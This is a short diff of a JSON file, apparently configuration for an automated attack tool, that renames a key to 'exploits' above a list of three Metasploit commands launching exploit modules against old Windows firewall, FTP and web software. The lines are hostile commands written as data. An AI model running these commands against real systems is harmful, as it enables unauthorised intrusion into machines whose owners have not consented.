@@ -1,5 +1,5 @@
 {
-  "defaults": [
+  "exploits": [
      "use exploit/windows/firewall/blackice_pam_icq; exploit -j;",
      "use exploit/windows/ftp/ms09_053_ftpd_nlst;exploit -j;",
      "use exploit/windows/http/amlibweb_webquerydll_app;exploit -j;",
